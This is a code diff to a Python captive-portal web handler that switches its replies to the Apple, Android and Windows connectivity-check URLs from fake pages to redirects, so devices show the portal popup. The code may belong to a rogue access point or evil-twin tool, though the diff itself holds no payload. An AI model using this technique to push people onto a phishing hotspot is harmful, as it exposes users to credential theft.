@@ -198,32 +198,29 @@ dhcp-leasefile={self.dnsmasq_leases}
             def do_GET(self):
                 """Handle ALL GET requests - serve portal for everything"""
 
-                # Captive portal detection URLs - respond with wrong data to trigger popup
+                # Captive portal detection URLs - redirect to portal
                 if self.path in ['/hotspot-detect.html', '/library/test/success.html']:
-                    # Apple expects "Success" - give different response
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/html')
+                    # Apple - redirect to portal
+                    self.send_response(302)
+                    self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                     self.end_headers()
-                    self.wfile.write(b'<!DOCTYPE html><html><body>Redirect</body></html>')
-                    print(f"[+] Apple captive portal detection triggered")
+                    print(f"[+] Apple captive portal detection - redirecting to portal")
                     return
 
                 if self.path in ['/generate_204', '/gen_204']:
-                    # Android expects 204 - give 200 with content
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/html')
+                    # Android - redirect to portal
+                    self.send_response(302)
+                    self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                     self.end_headers()
-                    self.wfile.write(b'<!DOCTYPE html><html><body>Redirect</body></html>')
-                    print(f"[+] Android captive portal detection triggered")
+                    print(f"[+] Android captive portal detection - redirecting to portal")
                     return
 
                 if self.path in ['/ncsi.txt', '/connecttest.txt']:
-                    # Windows expects specific text - give wrong text
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/plain')
+                    # Windows - redirect to portal
+                    self.send_response(302)
+                    self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                     self.end_headers()
-                    self.wfile.write(b'Redirect')
-                    print(f"[+] Windows captive portal detection triggered")
+                    print(f"[+] Windows captive portal detection - redirecting to portal")
                     return
 
                 # For ALL other requests, try to serve the file from portal dir
